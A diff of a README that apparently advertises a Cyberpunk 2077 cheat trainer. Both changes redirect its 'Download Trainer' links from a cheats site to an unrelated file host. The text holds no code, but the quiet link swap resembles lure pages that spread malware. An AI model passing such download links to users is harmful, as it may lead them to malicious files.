@@ -6,7 +6,7 @@
 
 Whether you want to **go full god mode**, max out every skill, or walk around as a silent cyber-ghost — this trainer has every tool you need to bend the game to your will 🔥
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/cyberpunk-2077/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🧠 What Can the Cyberpunk 2077 Trainer Do?
@@ -51,7 +51,7 @@ Whether you want to **go full god mode**, max out every skill, or walk around as
 * **Freeze Time** – Stop time completely
 * **Disable Police AI** – No more wanted system
 
-[![Download Trainer](https://i.playground.ru/e/vYTmjpI1RSGZ63V0R35eVQ.png)](https://wecheaters.github.io/cheats/cyberpunk-2077/)
+[![Download Trainer](https://i.playground.ru/e/vYTmjpI1RSGZ63V0R35eVQ.png)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🆚 Vanilla vs Trainer Experience
